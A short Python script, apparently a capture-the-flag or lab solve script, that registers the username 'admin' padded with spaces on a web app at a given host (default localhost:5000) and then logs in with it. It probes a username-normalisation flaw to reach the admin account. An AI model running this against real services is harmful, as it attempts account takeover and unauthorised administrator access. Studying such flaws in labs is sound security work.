import requests
import argparse

parser = argparse.ArgumentParser()
parser.add_argument('host', default='localhost', nargs='?')
parser.add_argument('port', default='5000', nargs='?')
args = parser.parse_args()


username = '  admin  '

r = requests.post(
    'http://{}:{}/register'.format(args.host, args.port),
    data={'username': username, 'password': 'password'})
print(r.text)

r = requests.post(
    'http://{}:{}/login'.format(args.host, args.port),
    data={'username': username, 'password': 'password'})
print(r.text)
